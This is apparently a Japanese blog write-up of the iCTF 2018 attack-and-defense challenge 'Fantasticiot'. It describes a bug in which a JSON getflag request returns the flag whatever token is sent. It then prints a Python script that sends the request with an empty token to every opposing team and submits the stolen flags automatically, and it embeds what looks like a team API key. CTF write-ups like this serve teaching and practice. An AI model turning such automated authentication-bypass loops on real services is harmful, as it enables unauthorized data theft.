---
layout: post
alias: "/blog/2018/03/17/ictf-2018-fantasticiot/"
title: "iCTF 2018: Fantasticiot"
date: "2018-03-17T16:45:46+09:00"
tags: [ "ctf", "writeup", "ictf", "attack-and-defense" ]
---

-   <https://ictf2018.net/>
-   <https://scoreboard.ictf2018.net/#/scores>

A&Dだと気付いたので参加した回。
順位が上のチームからしか攻撃点が得られないわりに点差が開かないため「最終tickまで順位調整しつつ潜伏しておいて最後にまとめてflag提出」が有効に見えた。
1位のチームはscoreboard hackを疑いたくなる点数取ってた。

## solution

動いてるbinaryをrevすると入力がjsonであることが分かる。特に以下の4つを受け入れる。
op `getflag` に存在する `token` field はおそらく一致判定が必要なものであるが、これが何であれ結果が返ってきてしまうバグがある。他は見なくてよかった。

``` json
{
    "service": "flag",
    "op": "getflag",
    "id": "${ID}",
    "token": "${TOKEN}"
}
```

``` json
{
    "service": "flag",
    "op": "setflag",
    "id": "${ID}",
    "token": "${TOKEN}",
    "flag": "${FLAG}"
}
```

``` json
{
    "service": "fridge",
    "op": "addfridge",
    ...
}
```

``` json
{
    "service": "fridge",
    "op": "getfridge",
    ...
}
```

## implementation

与えられた `hack_the_planet.py` を修正。


並列化しないとtimeout待ちで遅い。

``` python
#!/usr/bin/env python2

# This code was written 10 hours before the competition, yikes
# Any bugs are your problem

import socks # pip install PySocks
import socket
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4444)
socket.socket = socks.socksocket

from pwn import * # pip install pwntools
from swpag_client import Team # pip install swpag_client
import time
import concurrent.futures
import sys

team = Team(None, "SazPO4ahE9QQqQ21ryBe8UEL017vis7t")

def team_ip(team_host):
    # 172.31.129.1 (team1) ... 172.31.129.254 (team254) ... 172.31.130.1 (team255) ...
    team_number = int(team_host[4:])
    minor = ((team_number - 1) % 254) + 1
    major = (team_number / 255) + 129
    return '172.31.{major}.{minor}'.format(major=major, minor=minor)

import json
def pwn_fantasticiot(conn, flag_id):
    payload = {
        'service': 'flag',
        'op': 'getflag',
        'id': flag_id,
        'token': '',
    }
    conn.sendline(json.dumps(payload))
    result = json.loads(conn.recvline())
    print result
    return result['flag']

def attack_fantasticiot(ip, port, flag_id):
    try:
        with remote(ip, port, timeout=1) as conn:
            if service['service_name'] == u'fantasticiot':
                flag = pwn_fantasticiot(conn, flag_id)
            else:
                assert False
        result = team.submit_flag([ flag ])
        service_flag_ids[service['service_name']].add(flag_id)
        print("HACKED", flag, result)
    except Exception as e:
        print("Error connecting to", target['team_name'], target['hostname'], ip, port)
        print(e)

services = team.get_service_list()
service_flag_ids = dict()
while True:
    for service in services:
        if service['service_name'] != u'fantasticiot':
            continue
        print("Going to attack", service['service_name'])
        if service['service_name'] not in service_flag_ids:
            service_flag_ids[service['service_name']] = set()
        targets = team.get_targets(service['service_id'])
        with concurrent.futures.ThreadPoolExecutor() as executor:
            for target in targets:
                flag_id = target['flag_id']
                ip = team_ip(target['hostname'])
                port = target['port']
                if flag_id not in service_flag_ids[service['service_name']]:
                    service_flag_ids[service['service_name']].add(flag_id)
                    executor.submit(attack_fantasticiot, ip, port, flag_id)

    time.sleep(10) # DOS is against the rules
```
